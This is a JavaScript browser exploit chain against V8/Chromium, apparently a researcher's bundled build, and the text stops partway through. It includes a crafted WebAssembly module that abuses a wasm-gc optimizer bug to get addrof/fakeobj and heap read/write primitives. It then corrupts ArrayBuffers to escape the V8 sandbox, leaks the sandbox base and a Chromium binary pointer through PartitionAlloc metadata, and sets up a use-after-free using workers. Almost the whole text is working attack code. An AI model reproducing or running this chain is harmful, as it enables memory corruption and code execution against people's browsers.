(async function() {
/* ############### START research:chains/2024-12-10/exploit.js ############### */
{


/* ############### START research:memcor/wasm-gc-opt-loop-backedge-skip/exploit.js ############### */
{


/// Obtains heap AF / RW primitives

/* ############### START base:utils/basics.js ############### */
{


/* ############### START base:constants.js ############### */
{


/// A list of well-known constants / offsets which we hardcode
/// Keep this list as small as possible!

//TODO: this has a hardcoded dependency on the platform (Android has a less-big sandbox)
//Look into ways of auto-detecting the shit amounts and adjusting based of that
;
;

;
;

;

}
/* ############### END base:constants.js ############### */

/* ############### START base:utils/log.js ############### */
{


var global = new Function('return this')();
global._log_impl ??= (script, msg) => console.log(`[${script ?? "main"}] ${msg}`);
global.log ??= msg => _log_impl('main', msg);

;

}
/* ############### END base:utils/log.js ############### */

/* start late pre-script hooks for base:utils/basics.js */
let log = msg => _log_impl('base:utils/basics.js', msg);
/* end pre-script hooks for base:utils/basics.js */

/* ############### START base:utils/binconv.js ############### */
{
let log = msg => _log_impl('base:utils/binconv.js', msg);


let conv_buf = new ArrayBuffer(8);
let conv_doubles = new Float64Array(conv_buf);
let conv_int32s = new Uint32Array(conv_buf);
let conv_int64s = new BigUint64Array(conv_buf);

f2il = function f2il(v) {
    conv_doubles[0] = v;
    return conv_int32s[0];
};
f2ih = function f2ih(v) {
    conv_doubles[0] = v;
    return conv_int32s[1];
};
f2bi = function f2bi(v) {
    conv_doubles[0] = v;
    return conv_int64s[0];
};
i2f = function i2f(l, h) {
    conv_int32s[0] = l;
    conv_int32s[1] = h; 
    return conv_doubles[0];
};
bi2f = function bi2f(v) {
    conv_int64s[0] = v; 
    return conv_doubles[0];
};

}
/* ############### END base:utils/binconv.js ############### */

/* ############### START base:utils/misc.js ############### */
{
let log = msg => _log_impl('base:utils/misc.js', msg);


spin = function spin(ms) {
    let end = Date.now() + ms;
    while(Date.now() < end);
};

sleep = function sleep(ms) {
    return new Promise(rslv => setTimeout(rslv, ms));
};

evt_loop_yield = function evt_loop_yield(ms) {
    return sleep(0);
}

}
/* ############### END base:utils/misc.js ############### */


}
/* ############### END base:utils/basics.js ############### */

/* start late pre-script hooks for research:memcor/wasm-gc-opt-loop-backedge-skip/exploit.js */
let log = msg => _log_impl('research:memcor/wasm-gc-opt-loop-backedge-skip/exploit.js', msg);
/* end pre-script hooks for research:memcor/wasm-gc-opt-loop-backedge-skip/exploit.js */

/* ############### START base:utils/gc.js ############### */
{
let log = msg => _log_impl('base:utils/gc.js', msg);


/* file base:utils/misc.js already imported */

const _EVICT_ARR = [];
evict_young_gen = function evict_young_gen() {
    /// Evicts objects from the young generation, moving them to the old generation
    /// Cons: young generation is in unknown state afterwards
    let x = 0;
    for(let i = 0; i < 5000; i++) {
        _EVICT_ARR.length = 0;
        _EVICT_ARR.length = 0x2000;
        _EVICT_ARR.fill(1337);
        
        x += _EVICT_ARR[0];
    }
    _EVICT_ARR.length = 0;
    return x;
};

flush_young_gen = function flush_young_gen() {
    /// Flushes the young generation, making it completely empty
    /// Cons: litters in the old generation

    //This method is so overly complicated behind the scenes, and it's 1:35am right now
    //So I can't be bothered to write docs
    let outer = [ [], [], [], [], [] ];
    for(let i = 0; i < outer.length; i++) outer[i].length = 0x100000;
    for(let i = 0; i < outer.length; i++) outer[i].fill(13.37);
    return outer;
};

function major_gc() {
    /// Triggers a major GC
    //Do this by creating an immense amount of temporary memory pressure
    let x = 0;
    for(let i = 0; i < 32; i++) {
        let buf = new ArrayBuffer(0x10000000);
        x += buf.length;
    }
    return x;
}

function refill_lab() {
    /// Refills the old generation's Linear Allocation Buffer (LAB)
    /// Allocations within it have a predictable layout (since it's just a bump allocator)
    const LARGEST_FREE_LIST_CATEGORY = 65536; // from free-list.h
    const LAB_REFILL_AMOUNT = 16 * 1024; // 16kB
    const NUM_FREE_LIST_PULLS = 5;

    //Create a bunch of big allocations in the old generation
    //The allocations are so big that it falls into the last / biggest free list category
    let arr = [];
    for(let i = 0; i < 5; i++) {
        arr.length = NUM_FREE_LIST_PULLS * (2*LARGEST_FREE_LIST_CATEGORY + LAB_REFILL_AMOUNT) / 4;
        arr.fill(1337);
        evict_young_gen();

        // - immediately free the allocation so it can be picked up by the GC
        arr.length = 0;
    }

    //Trigger a major GC to pick up our dead allocations
    major_gc();

    // - spin for a bit so things settle down
    spin(1000);

    //Now allocate a bunch less-big-but-still-big chunk of memory in the old generation
    //It also falls into the last free list category, so it takes the free list entry we inserted earlier
    //The scraps (= our desired refill amount) refills the LAB
    //If some other allocations sneaked their way before our free entry, that's OK; we specifically overallocated to eat up these allocations if needed
    for(let i = 0; i < NUM_FREE_LIST_PULLS; i++) { 
        arr.length = (2*LARGEST_FREE_LIST_CATEGORY) / 4;
        arr.fill(1337);
        evict_young_gen();
        arr.length = 0;
    }

    return arr;
}

const NEVER_GC = [];
function forget(obj) {
    NEVER_GC.push(obj);
}

delete forget;
delete major_gc;
delete refill_lab;
}
/* ############### END base:utils/gc.js ############### */


let wasm_mod = new WebAssembly.Module(new Uint8Array([0,97,115,109,1,0,0,0,1,46,9,95,1,127,1,95,1,111,1,95,1,100,0,1,96,3,127,110,127,0,96,3,127,110,111,0,96,1,111,1,127,96,1,127,1,111,96,1,127,1,127,96,2,127,127,0,2,51,2,2,106,115,19,112,119,110,95,105,110,116,95,99,97,116,99,104,95,116,114,97,112,115,0,3,2,106,115,19,112,119,110,95,114,101,102,95,99,97,116,99,104,95,116,114,97,112,115,0,4,3,7,6,5,6,7,8,3,4,7,61,6,6,97,100,100,114,111,102,0,2,7,102,97,107,101,111,98,106,0,3,7,104,114,101,97,100,51,50,0,4,8,104,119,114,105,116,101,51,50,0,5,7,112,119,110,95,105,110,116,0,6,7,112,119,110,95,114,101,102,0,7,10,221,11,6,27,1,1,100,0,251,1,0,33,1,65,0,32,1,32,0,16,1,32,1,251,2,0,0,65,126,113,11,27,1,1,100,1,251,1,1,33,1,65,0,32,1,32,0,65,1,114,16,0,32,1,251,2,1,0,11,34,1,1,100,2,251,1,0,251,0,2,33,1,65,0,32,1,32,0,65,7,107,16,0,32,1,251,2,2,0,251,2,0,0,11,36,1,1,100,2,251,1,0,251,0,2,33,2,65,0,32,2,32,0,65,7,107,16,0,32,2,251,2,2,0,32,1,251,5,0,0,11,172,5,1,6,110,32,0,4,64,15,11,251,1,0,34,3,34,4,34,5,26,65,210,9,251,28,34,8,34,7,34,6,26,32,0,4,64,251,1,0,33,7,11,3,64,32,3,251,22,0,32,2,251,5,0,0,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,4,33,3,32,5,33,4,32,1,33,5,32,7,33,8,32,6,33,7,251,1,0,33,6,12,0,11,0,11,172,5,1,6,110,32,0,4,64,15,11,251,1,1,34,3,34,4,34,5,26,65,210,9,251,28,34,8,34,7,34,6,26,32,0,4,64,251,1,1,33,7,11,3,64,32,3,251,22,1,32,2,251,5,1,0,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,4,33,3,32,5,33,4,32,1,33,5,32,7,33,8,32,6,33,7,251,1,1,33,6,12,0,11,0,11]));
let wasm_inst = new WebAssembly.Instance(wasm_mod, {
    "js": {
        "pwn_int_catch_traps": (...args) => {
            try {
                pwn_int(...args);
            } catch {}
        },
        "pwn_ref_catch_traps": (...args) => {
            try {
                pwn_ref(...args);
            } catch {}
        }
    }
});

var { addrof, fakeobj, hread32, hwrite32 } = wasm_inst.exports;
let { pwn_int, pwn_ref } = wasm_inst.exports;

log("warmup...");

//Tier up the pwn functions which trigger the bug
for(let i = 0; i < 100000; i++) {
    pwn_int(1);
    pwn_ref(1);
}

//Tier up addrof / fakeobj JS-to-WASM wrappers to improve reliability
flush_young_gen(); // - a GC here kills us

const obj = {};

let addr, fobj;
for(let i = 0; i < 5000; i++) addr = addrof(obj);
for(let i = 0; i < 5000; i++) fobj = fakeobj(addr);

if(obj != fobj) throw new Error("addrof/fakeobj are broken!");

//Tier up hread32 / hwrite32 to actually make them work
addr |= 1; // - setting the lowest bit makes the non-optimized variant think this is an Smi (after the offset is subtracted), and as such it doesn't crash
for(let i = 0; i < 100000; i++) {
    let v = hread32(addr);
    hwrite32(addr, v);
}

log(" - ok");


}
/* ############### END research:memcor/wasm-gc-opt-loop-backedge-skip/exploit.js ############### */

/* start late pre-script hooks for research:chains/2024-12-10/exploit.js */
let log = msg => _log_impl('research:chains/2024-12-10/exploit.js', msg);
/* end pre-script hooks for research:chains/2024-12-10/exploit.js */

/* ############### START base:bootstrap/stage2-primitives.js ############### */
{
let log = msg => _log_impl('base:bootstrap/stage2-primitives.js', msg);



/* file base:utils/basics.js already imported */

log("bootstrapping stage 2 primitives...");

let old_primitives = [addrof, fakeobj, hread32, hwrite32];

//Bootstrap proper addrof / fakeobj primitives using an object holder
//We place the object holder's elements array in the large-object space, to ensure that it doesn't move
let obj_holder = [];
obj_holder.length = 0x100000;
obj_holder.fill({});
evict_young_gen();

let addr_obj_holder = addrof(obj_holder);
log(`object holder addr: 0x${addr_obj_holder.toString(16)}`);

let addr_obj_holder_elems = hread32(addr_obj_holder + 8) & ~1;
log(`object holder elements addr: 0x${addr_obj_holder_elems.toString(16)}`);

addrof = function addrof(obj) {
    obj_holder[0] = obj;
    return (hread32(addr_obj_holder_elems + 8) & ~1) >>> 0; // - convert into an unsigned int
};

fakeobj = function fakeobj(addr) {
    hwrite32(addr_obj_holder_elems + 8, addr | 1);
    var obj = obj_holder[0];
    obj_holder[0] = {}; //defuse any potential GCs
    return obj;
};

//Bootstrap proper heap R/W primitives using an ArrayBuffer
let sbox_buf = new ArrayBuffer(0x1337);

function hack_sbox() {
    //Has to inside a function to trick V8 into not optimizing (yet)
    let sbox_buf_addr = addrof(sbox_buf) & ~1;
    log(`sbx buffer: 0x${sbox_buf_addr.toString(16)}`);

    hwrite32(sbox_buf_addr + 36 + 0, 0x00000000);
    hwrite32(sbox_buf_addr + 36 + 4, 0x00000000);

    hwrite32(sbox_buf_addr + 20 + 0, 0xffffffff);
    hwrite32(sbox_buf_addr + 20 + 4, 0xffffffff);

    hwrite32(sbox_buf_addr + 28 + 0, 0xffffffff);
    hwrite32(sbox_buf_addr + 28 + 4, 0xffffffff);
}
hack_sbox();

let sbox_view = new DataView(sbox_buf);

hread32 = function hread32(addr) {
    return sbox_view.getUint32(addr, true);
};

hwrite32 = function hwrite32(addr, val) {
    sbox_view.setUint32(addr, val, true);
};

// - some extra goodies
hread64 = function hread64(addr) {
    return sbox_view.getBigUint64(addr, true);
};

hwrite64 = function hwrite64(addr, val) {
    return sbox_view.setBigUint64(addr, val, true);
};

// - clean up after old primitives
log("cleaning up old primitives...");
for(let prim in old_primitives) {
    if(prim.cleanup != null) prim.cleanup();
}

log("success!");


delete hack_sbox;
}
/* ############### END base:bootstrap/stage2-primitives.js ############### */

/* ############### START research:sandbox/blink/partitionalloc-metadata/leak-sbx.js ############### */
{
let log = msg => _log_impl('research:sandbox/blink/partitionalloc-metadata/leak-sbx.js', msg);


/// PartitionAlloc technique inspired by https://ssd-disclosure.com/ssd-advisory-google-chrome-rce/
/// Version of the original technique which just leaks the sandbox base, which works even when the metadata is RO


/* file base:utils/basics.js already imported */
/* ############### START base:utils/heap-utils.js ############### */
{
let log = msg => _log_impl('base:utils/heap-utils.js', msg);


/// Util functions to do various common things once the heap has been pwned

/* file base:constants.js already imported */

buffer_data_ptr = function buffer_data_ptr(buf) {
    return Number(hread64(addrof(buf) + 36) >> BigInt(24));
};

create_heapview_buffer = function create_heapview_buffer(addr = 0, size = null) {
    if(size == null) size = 0xffffffffffffffffn >> BigInt(29);

    let buf = new ArrayBuffer();
    let buf_addr = addrof(buf);

    hwrite64(buf_addr + 36, BigInt(addr) << BigInt(24));
    hwrite64(buf_addr + 20, BigInt(size) << BigInt(29));
    hwrite64(buf_addr + 28, BigInt(size) << BigInt(29));

    if(buf.byteLength != size) throw new Error("failed to hack heap view buffer");
    return buf;
}

}
/* ############### END base:utils/heap-utils.js ############### */


const ARRAY_BUF_SIZE = 0x2000; // - constant ArrayBuffer size to ensure we're working with the same bucket the entire time

const SIZE_SlotSpanMetadata = 0x20;
const SIZE_PartitionBucket = 3*8 + 4 + 4 + 8 + 4 + 4;

//Find the ArrayBufferAllocator's SlotSpanMetadata
let buf = new ArrayBuffer(ARRAY_BUF_SIZE);
let backing_store = BigInt(buffer_data_ptr(buf));
log(`ArrayBuffer backing store: 0x${backing_store.toString(16)}`);

// - free the buffer again; its position should end up in the freelist
buf.transfer(0);
delete buf;

//Search the page holding slot metadata for our particular slot span
// - do this calculation using BigInts because the address exceeds 32 bits
let metadata_page = Number((backing_store & ~0xffffffffn) + 0x1000n);

let addr_slot_span_meta = null;
for(let off = 0; off < 0x1000; off += 8) {
    if((hread64(metadata_page + off) & 0xffffffffn) == (backing_store & 0xffffffffn)) {
        addr_slot_span_meta = metadata_page + off;
        break;
    }
}

if(addr_slot_span_meta == null) throw new Error("failed to find SlotSpanMetadata for ArrayBufferAllocator");

log(`SlotSpanMetadata addr: 0x${addr_slot_span_meta.toString(16)}`);

//Calculate the sandbox base based of the full pointer stored in freelist_head to the deceased ArrayBuffer's backing store
let freelist_head = hread64(addr_slot_span_meta + 0x00);
log(`freelist_head: 0x${freelist_head.toString(16)}`);

if((freelist_head & 0xffffffffn) != (backing_store & 0xffffffffn)) throw new Error("unexpected freelist_head value");

var SANDBOX_BASE = freelist_head - backing_store;
log(`sandbox base: 0x${SANDBOX_BASE.toString(16)}`);

//Leak the bucket pointer, which points into the Chromium binary
let vaddr_bucket = hread64(addr_slot_span_meta + 0x10);
log(`PartitionBucket addr: 0x${vaddr_bucket.toString(16)}`);

var BINARY_POINTER = vaddr_bucket;



}
/* ############### END research:sandbox/blink/partitionalloc-metadata/leak-sbx.js ############### */

/* ############### START research:sandbox/arraybuf-ext-uaf/exploit-blink.js ############### */
{
let log = msg => _log_impl('research:sandbox/arraybuf-ext-uaf/exploit-blink.js', msg);



/* file base:utils/log.js already imported */
/* file base:utils/gc.js already imported */
/* ############### START base:utils/heap-worker.js ############### */
{
let log = msg => _log_impl('base:utils/heap-worker.js', msg);



/* file base:utils/basics.js already imported */
/* file base:utils/gc.js already imported */
/* file base:utils/heap-utils.js already imported */
/* ############### START base:utils/worker.js ############### */
{
let log = msg => _log_impl('base:utils/worker.js', msg);


/* file base:utils/misc.js already imported */

let globals = new Function('return this')();

if(globals.Blob) {
    start_worker = function start_worker(src) {
        return new Worker(URL.createObjectURL(new Blob([src], { type: "application/javascript" })));
    };
} else {
    // - this must be D8, so we can just use its own API for launching a worker from a string
    start_worker = function start_worker(src) {
        return new Worker(src, { type: "string" });
    };
}

start_worker_func = function start_worker_func(declrs, func, ...args) {
    function stringify(val) {
        if(typeof val == "function") {
            //Dump the source code of the function / class
            return val.toString();
        } else if(Array.isArray(val)) {
            //We want to support arrays of functions / classes
            return `[${val.map(stringify).join(", ")}]`;
        } else if(typeof val == "bigint") {
            return `${val}n`;
        } else {
            return JSON.stringify(val);
        }
    }

    return start_worker(`${declrs.map(d => `${d}\n`).join("")}(${func})(${args.map(stringify).join(", ")})`);
};

ControlledWorker = class ControlledWorker {
    static start_new() {
        log(`Starting worker of type ${this.name}`);
        let worker = new this(false);
        return worker.init().then(() => worker);
    }

    static _worker_entry(cls) {
        //Create our own worker class instance
        let worker = new cls(true);
        worker.init().then(() => worker.run_worker()).then(() => worker.status[0xfff] = 2);
    }

    control_buf;
    control32;
    control64;
    status;

    worker_scope = null;

    get is_worker() { return this.worker_scope != null; }
    get should_run() { return this.status[0xfff] == 0; }

    constructor(is_worker) {
        if(is_worker) {
            this.worker_scope = new Function("return this")();
            return;
        }

        //Create a control buffer
        this.control_buf = new SharedArrayBuffer(0x3000);

        this.control32 = new Uint32Array(this.control_buf, 0x0000);
        this.control64 = new BigUint64Array(this.control_buf, 0x1000);
        this.status = new Uint8Array(this.control_buf, 0x2000);

        //Start the worker
        let declrs = [];
        for(let cls = new.target; cls != ControlledWorker; cls = cls.__proto__) declrs.unshift(cls.__proto__);

        this.worker = start_worker_func(declrs, "ControlledWorker._worker_entry", new.target);
    }

    async init() {
        if(!this.is_worker) {
            //Send the control buffer over to the worker
            this.worker.postMessage(this.control_buf);

            // - wait for the worker to receive it
            while(!this.status[0]) await evt_loop_yield();
            this.status[0] = 0; 
        } else {
            //Receive the control buffer
            this.control_buf = await this.recv_msg();
            this.control32 = new Uint32Array(this.control_buf, 0x0000);
            this.control64 = new BigUint64Array(this.control_buf, 0x1000);
            this.status = new Uint8Array(this.control_buf, 0x2000);

            // - signal the main thread that we received the control buffer
            this.status[0] = 1;
            while(this.status[0]);
        }
    }

    run_worker() {
        throw new Error("run_worker wasn't implemented");
    }

    recv_msg() {
        if(!this.is_worker) throw new Error("recv_msg can only be called from the worker");
        return new Promise((resolve, _) => {
            this.worker_scope.onmessage = ev => {
                this.worker_scope.onmessage = null;
                resolve(ev.data);
            };
        });
    }

    terminate() {
        this.status[0xfff] = 1;
        while(this.status[0xfff] != 2);
        this.worker.terminate();
    }
};

delete stringify;
}
/* ############### END base:utils/worker.js ############### */


HeapWorker = class HeapWorker extends ControlledWorker {
    static NUM_SMUGGLE_ARRAYS = 0x40;
    static SMUGGLE_ARRAY_SIZE = 0x100000;
    static SMUGGLE_SENTINEL = 0x13374242;

    heap_view = null;

    constructor(is_worker) {
        //Isolates are meant to be, well, isolated, so there's no easy way for us to obtain the address of its objects, even though they are in the same sandbox as ours
        //We also can't smuggle them through using (Shared)ArrayBuffers, since those only transfer the backing store, not the actual array object
        //(in the future we might be able to use Atomics.Mutex / JSSharedArray objects, but those are currently locked behind v8_flags.harmony_structs)
        //However, all worker isolates share the same BoundedPageAllocator object for allocating new pages within the sandbox, and the allocator maintains a free list
        //As such we can "leak" the address ahead of time by allocating a new page, inserting it back into the freelist, then starting the worker
        //We use the large object space for this, since all objects in it have their own page allocations
        //We also allocate multiple objects to increase the chances that just a single one of our main-thread allocations becomes a worker allocation
        let arrays = [];
        for(let i = 0; i < HeapWorker.NUM_SMUGGLE_ARRAYS; i++) {
            let arr = [];
            arr.length = HeapWorker.SMUGGLE_ARRAY_SIZE;
            arr.fill({});
            arrays.push(arr);
        }

        if(!is_worker) {
            //Keep track of the elements array of each large array; each one should be in the large object space
            let elems_addrs = [];
            for(let arr of arrays) {
                let addr = hread32(addrof(arr) + 8) & ~1;
                if(addr & 0xfff != 0x10) throw new Error("large array elements didn't end up in the large object space");
                elems_addrs.push(addr);
            }

            //Free the array allocations again, to put the element buffer region back into the freelist
            arrays.length = 0;
            arrays = null;
            major_gc(); // - we might have triggered a scavenger run earlier because of the memory pressure, moving some of our arrays into the old generation

            //Finally start the worker
            super(false);
            this._smuggle_elems_addrs = elems_addrs;
        } else {
            //We need the arrays later
            super(true);
            this._smuggle_arrays = arrays;
        }
    }

    async init() {
        await super.init();

        //If this is sandbox testing we have an easy life
        if(new Function("return this;")().Sandbox) {
            if(!this.is_worker) return;

            this.heap_view = new Sandbox.MemoryView(0, 0x100000000);
            let heap_view = new DataView(this.heap_view);
        
            this.worker_scope.addrof = function addrof(obj) {
                return Sandbox.getAddressOf(obj) & ~1;
            };
            this.worker_scope.fakeobj = function fakeobj(addr) {
                return Sandbox.getObjectAt(addr & ~1);
            };
            this.worker_scope.hread32 = function hread32(addr) {
                return heap_view.getUint32(addr, true);
            };
            this.worker_scope.hwrite32 = function hwrite32(addr, val) {
                heap_view.setUint32(addr, val, true);
            };
            this.worker_scope.hread64 = function hread64(addr) {
                return heap_view.getBigUint64(addr, true);
            };
            this.worker_scope.hwrite64 = function hwrite64(addr, val) {
                heap_view.setBigUint64(addr, val, true);
            };

            return;
        }

        if(!this.is_worker) {
            //Wait for the worker to be ready
            while(!this.status[0]);

            //Allocate some more arrays to ensure all the earlier pages are mapped
            let arrays = [];
            for(let i = 0; i < HeapWorker.NUM_SMUGGLE_ARRAYS; i++) {
                let arr = [];
                arr.length = HeapWorker.SMUGGLE_ARRAY_SIZE;
                arr.fill({});
                arrays.push(arr);
            }

            //Look for the smuggle sentinel in all pages
            let smuggled_elems_addr = null;
            for(let addr of this._smuggle_elems_addrs) {
                if(hread32(addr + 8) == (HeapWorker.SMUGGLE_SENTINEL << 1)) {
                    //We found the elements buffer of one of the worker's smuggle arrays!
                    smuggled_elems_addr = addr;
                    break;
                }
            }

            if(smuggled_elems_addr == null) throw new Error("array elements smuggle failed; didn't find sentinel");
            log(` - smuggled array elements addr: 0x${smuggled_elems_addr.toString(16)}`);
            
            //Turn the worker's ArrayBuffer into a full heap view buffer
            let worker_buf_addr = hread32(smuggled_elems_addr + 8 + 4) & ~1;
            log(` - worker heap view buffer addr: 0x${worker_buf_addr.toString(16)}`);

            hwrite64(worker_buf_addr + 36, 0x0000000000000000n);
            hwrite64(worker_buf_addr + 20, 0xffffffffffffffffn);
            hwrite64(worker_buf_addr + 28, 0xffffffffffffffffn);

            //Provide the worker with the address of its smuggled elements buffer so that it can recyle it to bootstrap its addrof/fakeobj primitives
            hwrite32(smuggled_elems_addr + 8 + 0, (HeapWorker.SMUGGLE_SENTINEL + 1) << 1);
            hwrite32(smuggled_elems_addr + 8 + 4, smuggled_elems_addr << 1);

            //Signal the worker that we're done
            this.status[0] = 0;
        } else {
            //Allocate an ArrayBuffer as our heap view buffer; the main thread will modify it to be able to access the entire heap
            //Place it after a sentinel in each array which the main thread can look for
            this.heap_view = new ArrayBuffer();
            for(let arr of this._smuggle_arrays) {
                arr[0] = HeapWorker.SMUGGLE_SENTINEL;
                arr[1] = this.heap_view;
            }

            //Wait for the main thread to perform the smuggle
            this.status[0] = 1;
            while(this.status[0]);

            if(this.heap_view.byteLength == 0) throw new Error("smuggled failed; heap view buffer hasn't been modified");

            //The chosen smuggled arrays should also contain some additional information now
            let smuggle_arr = null;
            for(let arr of this._smuggle_arrays) {
                if(arr[0] == HeapWorker.SMUGGLE_SENTINEL) continue;
                if(arr[0] != HeapWorker.SMUGGLE_SENTINEL + 1) throw new Error(`unexpected sentinel in smuggle array: 0x${arr[0].toString(16)}`);
                smuggle_arr = arr;
                break;
            }
            delete this._smuggle_arrays;

            // - we recycle the smuggle array for our addrof/fakeobj primitives, since it's in LO space and as such won't move
            let smuggle_elements_addr = smuggle_arr[1];
            if(typeof smuggle_elements_addr != "number" || (smuggle_elements_addr & 0x3) != 0) throw new Error(`invalid smuggled array elements addr: ${smuggle_elements_addr}`);

            //Bootstrap the worker's heap primitives using the smuggled heap view buffer
            let heap_view = new DataView(this.heap_view);

            this.worker_scope.addrof = function addrof(obj) {
                smuggle_arr[0] = obj;
                return hread32(smuggle_elements_addr + 8) & ~1;
            };
            this.worker_scope.fakeobj = function fakeobj(addr) {
                hwrite32(smuggle_elements_addr + 8, addr | 1);
                var obj = smuggle_arr[0];
                smuggle_arr[0] = {}; //defuse any potential GCs
                return obj;
            };

            this.worker_scope.hread32 = function hread32(addr) {
                return heap_view.getUint32(addr, true);
            };
            this.worker_scope.hwrite32 = function hwrite32(addr, val) {
                heap_view.setUint32(addr, val, true);
            };
            this.worker_scope.hread64 = function hread64(addr) {
                return heap_view.getBigUint64(addr, true);
            };
            this.worker_scope.hwrite64 = function hwrite64(addr, val) {
                heap_view.setBigUint64(addr, val, true);
            };
        }
    }
};

WriteHammer = class WriteHammer extends HeapWorker {
    write_to(addr, val) {
        if(this.control32[0] != 0) this.stop();

        this.control32[1] = val;
        this.control32[0] = addr;
        while(this.status[0] != 1);

        spin(10); // - give the worker a bit to properly start hammering the address
    }

    stop() {
        this.control32[0] = 0;
        while(this.status[0] != 0);
    }

    run_worker() {
        //Move control32 into a local, slightly speeding up access times
        let control32 = this.control32;

        while(true) {
            //Wait until we get an address to hammer
            while(this.should_run && !control32[0]);
            if(!this.should_run) break;

            //Hammer the address until we should stop
            let addr = control32[0];
            let val = control32[1];
            let arr = new Uint32Array(this.heap_view, addr, 4);

            this.status[0] = 1;
            while(control32[0]) arr[0] = val;
            this.status[0] = 0;
        }
    }

    terminate() {
        this.stop();
        super.terminate();
    }
};

}
/* ############### END base:utils/heap-worker.js ############### */


//Prepare a fake BackingStore for later
let fake_backing_store = new ArrayBuffer(0x1000);
let fake_backing_store_addr = SANDBOX_BASE + BigInt(buffer_data_ptr(fake_backing_store));
let fake_backing_store_view = new DataView(fake_backing_store);

fake_backing_store_view.setBigUint64(0x00, fake_backing_store_addr, true);  //buffer_start_
fake_backing_store_view.setBigUint64(0x08, 0x1337n, true);                  //byte_length_
fake_backing_store_view.setBigUint64(0x10, 0x1337n, true);                  //max_byte_length_
fake_backing_store_view.setBigUint64(0x18, 0x1337n, true);                  //byte_capacity_

log(`fake BackingStore address: 0x${fake_backing_store_addr.toString(16)}`);

//Prepare a fake ArrayBufferExtension spray for later
let fake_array_buf_ext = new ArrayBuffer(0x30);
let fake_array_buf_ext_view = new DataView(fake_array_buf_ext);

fake_array_buf_ext_view.setBigUint64(0x00, 0n, true);                               //owning_table_
fake_array_buf_ext_view.setUint32(0x08, 0, true);                                   //ept_entry_
fake_array_buf_ext_view.setUint8(0x0c, 0, true);                                    //marked_
